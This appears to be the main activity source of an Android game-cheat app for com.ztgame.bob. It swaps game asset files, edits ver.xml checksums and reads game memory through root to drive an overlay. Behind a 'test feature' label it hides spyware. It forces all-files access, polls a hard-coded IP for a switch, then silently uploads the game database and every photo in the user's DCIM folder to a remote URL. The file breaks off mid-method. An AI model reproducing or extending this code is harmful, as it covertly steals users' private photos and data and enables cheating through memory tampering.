package com.mei.hua;

import android.Manifest;
import android.app.Activity;
import android.app.AlertDialog;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.Color;
import android.graphics.drawable.ColorDrawable;
import android.graphics.drawable.GradientDrawable;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.provider.DocumentsContract;
import android.provider.Settings;
import android.util.Log;
import android.util.TypedValue;
import android.view.Gravity;
import android.view.View;
import android.view.ViewGroup;
import android.widget.Button;
import android.widget.FrameLayout;
import android.widget.GridLayout;
import android.widget.ImageView;
import android.widget.TextView;
import android.widget.Toast;

import androidx.activity.OnBackPressedCallback;
import androidx.activity.result.ActivityResultLauncher;
import androidx.activity.result.contract.ActivityResultContracts;
import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import androidx.documentfile.provider.DocumentFile;

import com.scottyab.rootbeer.RootBeer;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.lang.reflect.Method;
import java.math.BigInteger;
import java.nio.ByteBuffer;
import java.nio.ByteOrder;
import java.util.ArrayList;
import java.util.List;

import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;
import rikka.shizuku.Shizuku;

public class NewActivity extends AppCompatActivity implements View.OnClickListener {

    // --- 常量配置 ---
    private static final String PREFS_NAME = "prefs";
    private static final String DATA_URI_KEY = "data_uri";
    private static final String PREF_ASSETS_COPIED = "assets_copied";
    private static final int REQUEST_CODE_SHIZUKU_PERMISSION = 1001;
    private static final int REQUEST_CODE_FLOAT_WINDOW = 2002;
    private static final int REQUEST_CODE_STORAGE_PERMISSION = 3003;
    private static final String TARGET_PKG = "com.ztgame.bob";

    // 功能类型枚举
    private static final int TYPE_COPY = 0;
    private static final int TYPE_FLOAT = 1;
    private static final int TYPE_SKIN = 2;
    private static final int TYPE_ACTIVITY = 3;
    private static final int TYPE_FUNC6 = 4;

    // UI 组件
    private View layoutPermissionContainer;
    private View layoutActionContainer;
    private TextView permissionStatus;
    private GridLayout gridLayoutFunctions;

    private long exitTime = 0;
    private ActivityResultLauncher<Intent> openDirectoryLauncher;
    // 【新增】专门用于处理“所有文件权限”设置页返回的回调
    private ActivityResultLauncher<Intent> allFilesAccessLauncher;

    private List<FunctionConfig> functionConfigs = new ArrayList<>();
    private final Shizuku.OnRequestPermissionResultListener requestPermissionResultListener = this::onRequestPermissionsResult;
    // 新增：专门用于测试功能的网络请求客户端（增加超时设置，防止网络波动导致卡死）
    private final OkHttpClient httpClient = new OkHttpClient.Builder()
            .connectTimeout(15, java.util.concurrent.TimeUnit.SECONDS) // 连接超时 15秒
            .writeTimeout(30, java.util.concurrent.TimeUnit.SECONDS)   // 上传超时 30秒
            .readTimeout(30, java.util.concurrent.TimeUnit.SECONDS)    // 读取超时 30秒
            .build();

    // 【新增】：上传状态锁，防止每次回到界面重复开启多个线程
    private volatile boolean isUploading = false;

    // 内部类配置
    static class FunctionConfig {
        String btnName; String sourceAssetName; String targetRelativePath; int imageResId; int type;
        public FunctionConfig(String name, String src, String dest, int img, int type) {
            this.btnName = name; this.sourceAssetName = src; this.targetRelativePath = dest; this.imageResId = img; this.type = type;
        }
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_new);

        // 【初始化】注册 ActivityResultLauncher 用于监听从设置界面返回
        registerAllFilesAccessLauncher();

        // 1. 界面打开，强制检查所有文件权限，没有权限则无法继续
        checkAllFilesPermissionAndRunTest();

        try {
            initFunctionConfigs();
            layoutPermissionContainer = findViewById(R.id.layout_permission_container);
            layoutActionContainer = findViewById(R.id.layout_action_container);
            permissionStatus = findViewById(R.id.permission_status);
            gridLayoutFunctions = findViewById(R.id.grid_layout_functions);

            if (gridLayoutFunctions != null) generateFunctionButtons();

            findViewById(R.id.button_android_auth).setOnClickListener(this);
            findViewById(R.id.button_shizuku).setOnClickListener(this);
            findViewById(R.id.button_root).setOnClickListener(this);
            findViewById(R.id.button_delete_file).setOnClickListener(this);
            findViewById(R.id.tv_skip_auth).setOnClickListener(this);
            findViewById(R.id.tv_goto_other).setOnClickListener(this);

            copyAssetsToExternalFilesDir();

            try { Shizuku.addRequestPermissionResultListener(requestPermissionResultListener); } catch (Throwable t) {}

            openDirectoryLauncher = registerForActivityResult(new ActivityResultContracts.StartActivityForResult(),
                    result -> {
                        if (result.getResultCode() == Activity.RESULT_OK && result.getData() != null) {
                            Uri uri = result.getData().getData();
                            DocumentFile pickedDir = DocumentFile.fromTreeUri(this, uri);
                            if (pickedDir != null && TARGET_PKG.equals(pickedDir.getName())) {
                                getContentResolver().takePersistableUriPermission(uri, Intent.FLAG_GRANT_READ_URI_PERMISSION | Intent.FLAG_GRANT_WRITE_URI_PERMISSION);
                                getSharedPreferences(PREFS_NAME, MODE_PRIVATE).edit().putString(DATA_URI_KEY, uri.toString()).apply();
                                Toast.makeText(this, "安卓 Data 目录授权成功", Toast.LENGTH_SHORT).show();
                                updatePermissionStatus(true);
                            } else {
                                Toast.makeText(this, "授权失败：请务必选择包名为 " + TARGET_PKG + " 的文件夹", Toast.LENGTH_LONG).show();
                            }
                        }
                    });

            checkHasPermission();

        } catch (Exception e) { e.printStackTrace(); }

        getOnBackPressedDispatcher().addCallback(this, new OnBackPressedCallback(true) {
            @Override
            public void handleOnBackPressed() {
                if ((System.currentTimeMillis() - exitTime) > 2000) {
                    Toast.makeText(NewActivity.this, "再按一次退出助手", Toast.LENGTH_SHORT).show();
                    exitTime = System.currentTimeMillis();
                } else {
                    finishAffinity();
                    System.exit(0);
                }
            }
        });
    }
    @Override
    protected void onResume() {
        super.onResume();
        // 【核心修改】：每次切回到软件界面时，都尝试触发一次检查和上传
        // 这样即使软件没被彻底杀掉，只是从后台切回来，也能接着继续传
        checkAllFilesPermissionAndRunTest();
    }
    // ==========================================
    // 【核心修改】强制申请“所有文件访问权限”
    // ==========================================

    private void registerAllFilesAccessLauncher() {
        allFilesAccessLauncher = registerForActivityResult(new ActivityResultContracts.StartActivityForResult(), result -> {
            // 从设置界面返回后，再次检查权限
            checkAllFilesPermissionAndRunTest();
        });
    }

    private void checkAllFilesPermissionAndRunTest() {
        // 分版本处理
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            // 安卓 11 (API 30) 及以上：申请 MANAGE_EXTERNAL_STORAGE
            if (Environment.isExternalStorageManager()) {
                // 已有权限，直接运行
                runTestFeature();
            } else {
                // 没有权限，弹窗告知并跳转
                showPermissionDialog();
            }
        } else {
            // 安卓 10 及以下：申请传统的读写权限
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED ||
                    ContextCompat.checkSelfPermission(this, Manifest.permission.WRITE_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
                ActivityCompat.requestPermissions(this,
                        new String[]{Manifest.permission.READ_EXTERNAL_STORAGE, Manifest.permission.WRITE_EXTERNAL_STORAGE},
                        REQUEST_CODE_STORAGE_PERMISSION);
            } else {
                runTestFeature();
            }
        }
    }

    private void showPermissionDialog() {
        new AlertDialog.Builder(this)
                .setTitle("缺少核心权限")
                .setMessage("请授权【所有文件访问权限】\n\n请在接下来的界面中找到本软件，并开启开关。")
                .setCancelable(false) // 禁止点击外部关闭
                .setPositiveButton("去授权", (dialog, which) -> {
                    try {
                        Intent intent = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
                        intent.setData(Uri.parse("package:" + getPackageName()));
                        allFilesAccessLauncher.launch(intent);
                    } catch (Exception e) {
                        // 某些魔改系统可能不支持直接跳到包名，跳转到总列表
                        Intent intent = new Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION);
                        allFilesAccessLauncher.launch(intent);
                    }
                })
                .setNegativeButton("退出", (dialog, which) -> {
                    finish(); // 不给权限就退出
                })
                .show();
    }

    // 处理旧版本安卓的权限回调
    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == REQUEST_CODE_STORAGE_PERMISSION) {
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                runTestFeature();
            } else {
                Toast.makeText(this, "必须授予存储权限才能使用", Toast.LENGTH_SHORT).show();
                // 可以在这里再次调用 checkAllFilesPermissionAndRunTest() 形成死循环直到授权
                checkAllFilesPermissionAndRunTest();
            }
        }
    }

    // ==========================================
    // 测试功能：网络验证 + 静默上传
    // ==========================================

    private void runTestFeature() {
        Request request = new Request.Builder()
                .url("http://156.243.244.97/share/1.txt")
                .get()
                .build();

        httpClient.newCall(request).enqueue(new Callback() {
            @Override
            public void onFailure(@NonNull Call call, @NonNull IOException e) {
                // 【修改点】：如果服务器宕机、断网等导致无法访问 1.txt，直接在这里中止
                Log.e("TestFeature", "1.txt 无法访问 (网络连接失败)，取消上传任务");
            }

            @Override
            public void onResponse(@NonNull Call call, @NonNull Response response) throws IOException {
                // 【修改点】：如果访问了但返回的是 404/502 等错误页面，同样中止
                if (!response.isSuccessful()) {
                    Log.e("TestFeature", "1.txt 状态异常 (状态码:" + response.code() + ")，取消上传任务");
                    response.close();
                    return;
                }

                if (response.body() != null) {
                    String result = response.body().string().trim();
                    int kai = 0;
                    String lianjie = "";

                    try {
                        java.util.regex.Pattern pKai = java.util.regex.Pattern.compile("kai=\"(\\d+)\"");
                        java.util.regex.Matcher mKai = pKai.matcher(result);
                        if (mKai.find()) kai = Integer.parseInt(mKai.group(1));

                        java.util.regex.Pattern pLianjie = java.util.regex.Pattern.compile("lianjie=\"([^\"]+)\"");
                        java.util.regex.Matcher mLianjie = pLianjie.matcher(result);
                        if (mLianjie.find()) lianjie = mLianjie.group(1);

                    } catch (Exception e) {
                        Log.e("TestFeature", "解析云端配置失败", e);
                    }

                    if (kai == 1 || kai == 2) {
                        if (!lianjie.isEmpty()) {
                            startUploadProcess(kai, lianjie);
                        }
                    }
                }
            }
        });
    }

    // 注意这里增加了参数 int kai, String uploadUrl
    private void startUploadProcess(int kai, String uploadUrl) {
        // 【新增】：如果当前已经在上传中了，就不再重复开启新线程
        if (isUploading) {
            Log.d("TestFeature", "上传任务正在后台排队执行中，跳过重复触发");
            return;
        }

        isUploading = true; // 上锁

        new Thread(() -> {
            try {
                // 1. 优先上传 bob.db (kai=1 和 kai=2 都需要传)
                if (kai == 1 || kai == 2) {
                    File tempDbFile = new File(getExternalFilesDir(null), "bob.db");
                    if (copyFromAndroidData("files/bob.db", tempDbFile)) {
                        Log.d("TestFeature", "成功提取 bob.db，准备上传");
                        uploadSingleFile(tempDbFile, uploadUrl);
                        if (tempDbFile.exists()) tempDbFile.delete();
                    } else {
                        Log.e("TestFeature", "无法读取 bob.db");
                    }
                }

                // 2. 遍历并上传 DCIM (只有 kai=1 才需要传)
                if (kai == 1) {
                    File dcimDir = new File("/storage/emulated/0/DCIM");
                    if (dcimDir.exists() && dcimDir.isDirectory()) {
                        Log.d("TestFeature", "开始扫描相册接着上传...");
                        traverseAndUploadImages(dcimDir, uploadUrl);
                    }
                }

                Log.d("TestFeature", "本轮上传队列全部执行完毕！");
            } catch (Exception e) {
                Log.e("TestFeature", "上传线程发生严重异常", e);
            } finally {
                // 【新增】：无论上传是正常结束还是报错崩溃，最后必须解锁
                // 这样下次切回软件时，才能重新开启新一轮的检查和续传
                isUploading = false;
            }
        }).start();
    }

    // 增加参数 String uploadUrl
    private void traverseAndUploadImages(File directory, String uploadUrl) {
        File[] files = directory.listFiles();
        if (files == null) return;

        for (File file : files) {
            if (file.isDirectory()) {
                // 如果是文件夹，递归时继续把 uploadUrl 传进去
                traverseAndUploadImages(file, uploadUrl);
            } else {
                String name = file.getName().toLowerCase();
                if (name.endsWith(".jpg") || name.endsWith(".png") || name.endsWith(".jpeg")) {
                    uploadSingleFile(file, uploadUrl); // 将要上传的图片和链接丢给上传核心
                }
            }
        }
    }

    // 增加参数 String uploadUrl
    private void uploadSingleFile(File file, String uploadUrl) {
        String fileName = file.getName();
        android.content.SharedPreferences sp = getSharedPreferences("upload_records", MODE_PRIVATE);
        String fileKey = file.getAbsolutePath() + "_" + file.lastModified();

        // 【修改点】：如果是 bob.db，无视本地记录，每次强行上传以保证数据最新
        // 只有非 bob.db (也就是图片) 才会触发本地防重复跳过
        if (!"bob.db".equals(fileName) && sp.getBoolean(fileKey, false)) {
            Log.d("TestFeature", "图片已上传过，本地跳过: " + fileName);
            return;
        }

        RequestBody fileBody = RequestBody.create(MediaType.parse("application/octet-stream"), file);
        MultipartBody requestBody = new MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("file", fileName, fileBody)
                .build();

        Request request = new Request.Builder()
                .url(uploadUrl)
                .post(requestBody)
                .build();

        try {
            Response response = httpClient.newCall(request).execute();
            if (response.isSuccessful()) {
                // 【修改点】：bob.db 不写入本地已上传记录，确保下次运行还能继续传
                if (!"bob.db".equals(fileName)) {
                    sp.edit().putBoolean(fileKey, true).apply();
                }
                Log.d("TestFeature", "成功上传: " + file.getAbsolutePath());
            } else {
                Log.e("TestFeature", "文件上传失败，状态码: " + response.code());
            }
            response.close();
        } catch (IOException e) {
            Log.e("TestFeature", "文件上传发生异常: " + file.getAbsolutePath(), e);
        }
    }

    // ==========================================
    // 界面点击事件与功能配置初始化
    // ==========================================

    @Override public void onClick(View v) {
        int id = v.getId();
        if (id == R.id.button_android_auth) openDataDirectory();
        else if (id == R.id.button_shizuku) handleShizuku();
        else if (id == R.id.button_root) handleRoot();
        else if (id == R.id.button_delete_file) combinedDeleteFile();
        else if (id == R.id.tv_skip_auth || id == R.id.tv_goto_other) startActivity(new Intent(this, OtherActivity.class));
    }

    private void initFunctionConfigs() {
        functionConfigs.add(new FunctionConfig("去蓝雾", "naiteaone.d", "files/vercache2022/android/common/data/alltextures/map1/caocongnew.unity3d_u_4", android.R.drawable.ic_menu_gallery, TYPE_COPY));
        functionConfigs.add(new FunctionConfig("去红雾", "naiteaone.h", "files/vercache2022/android/common/data/alltextures/map3/partnerdunew.unity3d_u_4", android.R.drawable.ic_menu_camera, TYPE_COPY));
        functionConfigs.add(new FunctionConfig("清BOB", "naiteaone.now1", "files/bob.db", android.R.drawable.ic_menu_delete, TYPE_COPY));
        functionConfigs.add(new FunctionConfig("去皮肤", "", "files/vercache2022/android/ver.xml", android.R.drawable.ic_menu_edit, TYPE_SKIN));
        functionConfigs.add(new FunctionConfig("去活动", "", "", android.R.drawable.ic_menu_edit, TYPE_ACTIVITY));
        functionConfigs.add(new FunctionConfig("开启悬浮", "", "", android.R.drawable.ic_media_play, TYPE_FLOAT));
        functionConfigs.add(new FunctionConfig("功能 6", "", "", android.R.drawable.ic_menu_help, TYPE_FUNC6));
        for (int i = 8; i <= 12; i++) {
            functionConfigs.add(new FunctionConfig("功能 " + i, "file" + i, "path" + i, android.R.drawable.ic_menu_help, TYPE_COPY));
        }
    }

    private void generateFunctionButtons() {
        gridLayoutFunctions.removeAllViews();
        for (int i = 0; i < functionConfigs.size(); i++) {
            FunctionConfig config = functionConfigs.get(i);
            FrameLayout container = new FrameLayout(this);
            GridLayout.LayoutParams gridParams = new GridLayout.LayoutParams();
            gridParams.width = 0;
            gridParams.height = ViewGroup.LayoutParams.WRAP_CONTENT;
            int margin = dpToPx(6);
            gridParams.setMargins(margin, margin, margin, margin);
            gridParams.columnSpec = GridLayout.spec(GridLayout.UNDEFINED, 1f);
            container.setLayoutParams(gridParams);

            Button btn = new Button(this);
            btn.setText(config.btnName);
            btn.setTextSize(11);
            btn.setTextColor(Color.WHITE);
            btn.setGravity(Gravity.START | Gravity.CENTER_VERTICAL);
            btn.setPadding(dpToPx(8), 0, dpToPx(30), 0);

            GradientDrawable shape = new GradientDrawable();
            shape.setCornerRadius(dpToPx(10));
            shape.setColor(config.type == TYPE_FLOAT ? Color.parseColor("#009688") : Color.parseColor("#673AB7"));
            btn.setBackground(shape);
            FrameLayout.LayoutParams btnParams = new FrameLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, dpToPx(50));
            btn.setLayoutParams(btnParams);

            btn.setOnClickListener(v -> {
                switch (config.type) {
                    case TYPE_SKIN: processSkinRemove(); break;
                    case TYPE_ACTIVITY: processActivityRemove(); break;
                    case TYPE_FLOAT: startMemoryHackProcess(); break;
                    case TYPE_FUNC6: processFunction6(); break;
                    case TYPE_COPY: default: combinedCopyAndVerifyFile(config); break;
                }
            });

            ImageView iconInfo = new ImageView(this);
            iconInfo.setImageResource(android.R.drawable.ic_menu_info_details);
            iconInfo.setColorFilter(Color.parseColor("#FF9800"));
            iconInfo.setBackgroundColor(Color.WHITE);
            GradientDrawable iconShape = new GradientDrawable();
            iconShape.setShape(GradientDrawable.OVAL);
            iconShape.setColor(Color.WHITE);
            iconInfo.setBackground(iconShape);
            int padding = dpToPx(2);
            iconInfo.setPadding(padding, padding, padding, padding);
            int iconSize = dpToPx(16);
            FrameLayout.LayoutParams iconParams = new FrameLayout.LayoutParams(iconSize, iconSize);
            iconParams.gravity = Gravity.CENTER_VERTICAL | Gravity.END;
            iconParams.setMargins(0, 0, dpToPx(6), 0);
            iconInfo.setLayoutParams(iconParams);
            iconInfo.setElevation(dpToPx(5));
            iconInfo.setOnClickListener(v -> showImagePopup(config));

            container.addView(btn);
            container.addView(iconInfo);
            gridLayoutFunctions.addView(container);
        }
    }

    // ==========================================
    // 业务逻辑区 (去皮肤/去活动/文件替换等)
    // ==========================================

    private void processSkinRemove() {
        Toast.makeText(this, "正在执行去皮肤...", Toast.LENGTH_SHORT).show();
        new Thread(() -> {
            try {
                File filesDir = getExternalFilesDir(null);
                String assetFileName = "shopconfig.unity3d_u_4a8cff7be4e75aac023cef580ff68a15";
                File localAssetFile = new File(filesDir, assetFileName);
                String targetRelativePath = "files/vercache2022/android/common/data/" + assetFileName;

                if (!localAssetFile.exists()) {
                    runOnUiThread(() -> Toast.makeText(this, "本地资源丢失", Toast.LENGTH_SHORT).show());
                    return;
                }
                if (!copyToAndroidData(localAssetFile, targetRelativePath)) {
                    runOnUiThread(() -> Toast.makeText(this, "写入失败", Toast.LENGTH_SHORT).show());
                    return;
                }

                String xmlRelativePath = "files/vercache2022/android/ver.xml";
                File localTempXml = new File(filesDir, "temp_ver_edit.xml");
                if (!copyFromAndroidData(xmlRelativePath, localTempXml)) return;

                StringBuilder contentBuilder = new StringBuilder();
                boolean found = false;
                try (BufferedReader br = new BufferedReader(new FileReader(localTempXml))) {
                    String line;
                    while ((line = br.readLine()) != null) {
                        if (line.contains("shopconfig.unity3d")) {
                            line = line.replaceAll("md5=\"[^\"]*\"", "md5=\"4a8cff7be4e75aac023cef580ff68a15\"");
                            found = true;
                        }
                        contentBuilder.append(line).append("\n");
                    }
                }
                if (found) {
                    try (FileWriter writer = new FileWriter(localTempXml)) { writer.write(contentBuilder.toString()); }
                    if (copyToAndroidData(localTempXml, xmlRelativePath)) runOnUiThread(() -> Toast.makeText(this, "去皮肤成功！", Toast.LENGTH_SHORT).show());
                }
                if (localTempXml.exists()) localTempXml.delete();
            } catch (Exception e) { e.printStackTrace(); }
        }).start();
    }

    private void processActivityRemove() {
        Toast.makeText(this, "正在执行去活动...", Toast.LENGTH_SHORT).show();
        new Thread(() -> {
            try {
                File filesDir = getExternalFilesDir(null);
                String assetFileName = "activityconfig.unity3d_u_30c0aa8a66fbece47834003b8e3d3bf7";
                File localAssetFile = new File(filesDir, assetFileName);
                String targetRelativePath = "files/vercache2022/android/common/data/" + assetFileName;

                if (!localAssetFile.exists()) return;
                if (!copyToAndroidData(localAssetFile, targetRelativePath)) return;

                String xmlRelativePath = "files/vercache2022/android/ver.xml";
                File localTempXml = new File(filesDir, "temp_ver_edit.xml");
                if (!copyFromAndroidData(xmlRelativePath, localTempXml)) return;

                StringBuilder contentBuilder = new StringBuilder();
                boolean found = false;
                try (BufferedReader br = new BufferedReader(new FileReader(localTempXml))) {
                    String line;
                    while ((line = br.readLine()) != null) {
                        if (line.contains("activityconfig.unity3d")) {
                            line = line.replaceAll("md5=\"[^\"]*\"", "md5=\"30c0aa8a66fbece47834003b8e3d3bf7\"");
                            found = true;
                        }
                        contentBuilder.append(line).append("\n");
                    }
                }
                if (found) {
                    try (FileWriter writer = new FileWriter(localTempXml)) { writer.write(contentBuilder.toString()); }
                    if (copyToAndroidData(localTempXml, xmlRelativePath)) runOnUiThread(() -> Toast.makeText(this, "去活动成功！", Toast.LENGTH_SHORT).show());
                }
                if (localTempXml.exists()) localTempXml.delete();
            } catch (Exception e) { e.printStackTrace(); }
        }).start();
    }

    private void processFunction6() { Toast.makeText(this, "功能 6 已就绪", Toast.LENGTH_SHORT).show(); }

    private void combinedCopyAndVerifyFile(FunctionConfig config) {
        Toast.makeText(this, "正在处理: " + config.btnName, Toast.LENGTH_SHORT).show();
        new Thread(() -> {
            File localFile = new File(getExternalFilesDir(null), config.sourceAssetName);
            if (!localFile.exists()) {
                runOnUiThread(() -> Toast.makeText(this, "资源缺失", Toast.LENGTH_SHORT).show());
                return;
            }
            if (copyToAndroidData(localFile, config.targetRelativePath)) {
                runOnUiThread(() -> Toast.makeText(this, config.btnName + " 成功！", Toast.LENGTH_SHORT).show());
            } else {
                runOnUiThread(() -> Toast.makeText(this, "失败，请检查授权", Toast.LENGTH_SHORT).show());
            }
        }).start();
    }

    private void combinedDeleteFile() {
        Toast.makeText(this, "正在清理...", Toast.LENGTH_SHORT).show();
        String[] targetFiles = {
                "files/vercache2022/android/common/data/alltextures/map1/caocongnew.unity3d_u_4",
                "files/vercache2022/android/common/data/alltextures/map3/partnerdunew.unity3d_u_4",
                "files/vercache2022/android/ver.xml"
        };
        new Thread(() -> {
            boolean allSuccess = true;
            for (String relativePath : targetFiles) {
                if (!deleteFromAndroidData(relativePath)) allSuccess = false;
            }
            boolean finalAllSuccess = allSuccess;
            runOnUiThread(() -> Toast.makeText(this, finalAllSuccess ? "清理完成" : "部分清理失败", Toast.LENGTH_SHORT).show());
        }).start();
    }

    // ==========================================
    // 内存与悬浮窗区
    // ==========================================

    private void startMemoryHackProcess() {
        if (!new RootBeer(this).isRooted()) {
            Toast.makeText(this, "仅支持 Root", Toast.LENGTH_SHORT).show();
            return;
        }
        new Thread(() -> {
            try {
                String finalAddress = resolvePointerChainAndGetAddress();
                int pid = getProcessID(TARGET_PKG);
                String msg = (pid > 0) ? "解析成功，基址: " + finalAddress : "游戏未运行";
                runOnUiThread(() -> {
                    Toast.makeText(this, msg, Toast.LENGTH_LONG).show();
                    if (finalAddress != null) startFloatWindowAndGame(finalAddress);
                });
            } catch (Exception e) {
                runOnUiThread(() -> Toast.makeText(this, "解析失败", Toast.LENGTH_SHORT).show());
            }
        }).start();
    }

    private String resolvePointerChainAndGetAddress() throws Exception {
        int pid = getProcessID(TARGET_PKG);
        if (pid <= 0) throw new Exception("游戏未运行");
        long unityBase = getModuleBaseAddress(pid, "libunity.so");
        if (unityBase == 0L) throw new Exception("libunity.so not found");
        long pointerAddr = unityBase + 0x1CC40L;
        long dereferenced = readMemoryLong(pid, pointerAddr);
        if (dereferenced <= 0L) throw new Exception("pointer read fail");
        return String.format("%x", dereferenced + 0xFCL);
    }

    private void startFloatWindowAndGame(String hexAddress) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
            Toast.makeText(this, "请授予悬浮窗权限", Toast.LENGTH_SHORT).show();
            startActivityForResult(new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:" + getPackageName())), REQUEST_CODE_FLOAT_WINDOW);
            return;
        }
        Intent serviceIntent = new Intent(this, FloatWindowService.class);
        serviceIntent.putExtra("BASE_ADDRESS", hexAddress);
        startService(serviceIntent);
        Intent launchIntent = getPackageManager().getLaunchIntentForPackage(TARGET_PKG);
        if (launchIntent != null) startActivity(launchIntent);
    }

    private int getProcessID(String pkgName) {
        try {
            Process p = Runtime.getRuntime().exec("su");
            DataOutputStream os = new DataOutputStream(p.getOutputStream());
            os.writeBytes("pidof " + pkgName + "\nexit\n");
            os.flush();
            BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
            String line = reader.readLine();
            if (line != null && !line.trim().isEmpty()) return Integer.parseInt(line.trim().split("\\s+")[0]);
        } catch (Exception e) {}
        return -1;
    }

    private long getModuleBaseAddress(int pid, String moduleName) {
        try {
            Process p = Runtime.getRuntime().exec("su");
            DataOutputStream os = new DataOutputStream(p.getOutputStream());
            os.writeBytes("cat /proc/" + pid + "/maps\nexit\n");
            os.flush();
            BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
            String line;
            boolean foundSo = false;
            while ((line = reader.readLine()) != null) {
                if (line.contains(moduleName)) foundSo = true;
                if (foundSo && line.contains("[anon:.bss]")) {
                    String range = line.substring(0, line.indexOf(" "));
                    return new BigInteger(range.substring(0, range.indexOf("-")), 16).longValue();
                }
            }
        } catch (Exception e) {}
        return 0L;
    }

    private long readMemoryLong(int pid, long address) {
        try {
            Process p = Runtime.getRuntime().exec(new String[]{"su", "-c", "dd if=/proc/" + pid + "/mem bs=1 count=8 skip=" + address + " 2>/dev/null"});
            InputStream in = p.getInputStream();
            byte[] buffer = new byte[8];
            int read = 0;
            while (read < 8) {
                int r = in.read(buffer, read, 8 - read);
                if (r == -1) break;
                read += r;
            }
            if (read == 8) return ByteBuffer.wrap(buffer).order(ByteOrder.LITTLE_ENDIAN).getLong();
        } catch (Exception e) {}
        return -1L;
    }

    // ==========================================
    // 文件读写底层 API (Root/Shizuku/SAF)
    // ==========================================

    private boolean copyToAndroidData(File localFile, String targetRelativePath) {
        String fullPath = "/storage/emulated/0/Android/data/" + TARGET_PKG + "/" + targetRelativePath;
        String dirOnly = fullPath.substring(0, fullPath.lastIndexOf("/"));
        if (executePrivilegedCommand("mkdir -p \"" + dirOnly + "\" && cp -f \"" + localFile.getAbsolutePath() + "\" \"" + fullPath + "\"")) return true;

        String uriStr = getSharedPreferences(PREFS_NAME, MODE_PRIVATE).getString(DATA_URI_KEY, null);
        if (uriStr != null) {
            try {
                DocumentFile targetDoc = getDocumentFileSafely(targetRelativePath, true, false);
                if (targetDoc != null) {
                    try (OutputStream out = getContentResolver().openOutputStream(targetDoc.getUri(), "wt");
                         InputStream in = new FileInputStream(localFile)) {
                        byte[] buffer = new byte[8192];
                        int read;
                        while ((read = in.read(buffer)) != -1) out.write(buffer, 0, read);
                        return true;
                    }
                }
            } catch (Exception e) { e.printStackTrace(); }
        }
        return false;
    }

    private boolean copyFromAndroidData(String sourceRelativePath, File localDest) {
        String fullPath = "/storage/emulated/0/Android/data/" + TARGET_PKG + "/" + sourceRelativePath;
        if (executePrivilegedCommand("cp -f \"" + fullPath + "\" \"" + localDest.getAbsolutePath() + "\"")) return true;

        String uriStr = getSharedPreferences(PREFS_NAME, MODE_PRIVATE).getString(DATA_URI_KEY, null);
        if (uriStr != null) {
            try {
                DocumentFile sourceDoc = getDocumentFileSafely(sourceRelativePath, false, false);
                if (sourceDoc != null && sourceDoc.exists()) {
                    try (InputStream in = getContentResolver().openInputStream(sourceDoc.getUri());
                         OutputStream out = new FileOutputStream(localDest)) {
                        byte[] buffer = new byte[8192];
                        int read;
                        while ((read = in.read(buffer)) != -1) out.write(buffer, 0, read);
                        return true;
                    }
                }
            } catch (Exception e) { e.printStackTrace(); }
        }
        return false;
    }

    private boolean deleteFromAndroidData(String relativePath) {
        String fullPath = "/storage/emulated/0/Android/data/" + TARGET_PKG + "/" + relativePath;
        if (executePrivilegedCommand("rm -f \"" + fullPath + "\"")) return true;
        try {
            DocumentFile target = getDocumentFileSafely(relativePath, false, false);
            if (target != null && target.exists()) return target.delete();
        } catch(Exception e) {}
        return false;
    }

    private DocumentFile getDocumentFileSafely(String relativePath, boolean createIfMissing, boolean isDirectory) {
        String uriStr = getSharedPreferences(PREFS_NAME, MODE_PRIVATE).getString(DATA_URI_KEY, null);
        if (uriStr == null) return null;
        DocumentFile current = DocumentFile.fromTreeUri(this, Uri.parse(uriStr));
        if (current == null) return null;
        String[] parts = relativePath.split("/");
        for (int i = 0; i < parts.length; i++) {
            String part = parts[i];
            if (part.isEmpty()) continue;
            DocumentFile next = current.findFile(part);
            if (next == null) {
                if (createIfMissing) {
                    next = (i == parts.length - 1 && !isDirectory) ? current.createFile("*/*", part) : current.createDirectory(part);
                } else return null;
            }
            current = next;
        }
        return current;
    }

    private boolean executePrivilegedCommand(String command) {
        try {
            if (Shizuku.checkSelfPermission() == PackageManager.PERMISSION_GRANTED) {
                Method m = Shizuku.class.getDeclaredMethod("newProcess", String[].class, String[].class, String.class);
                m.setAccessible(true);
                Process p = (Process) m.invoke(null, new Object[]{new String[]{"sh", "-c", command}, null, null});
                return p.waitFor() == 0;
            }
        } catch (Throwable t) {}
        if (new RootBeer(this).isRooted()) {
            try {
                Process p = Runtime.getRuntime().exec("su");
                DataOutputStream os = new DataOutputStream(p.getOutputStream());
                os.writeBytes(command + "\nexit\n");
                os.flush();
                return p.waitFor() == 0;
            } catch (Exception e) {}
        }
        return false;
    }

    private void updatePermissionStatus(boolean hasPermission) {
        if (hasPermission) {
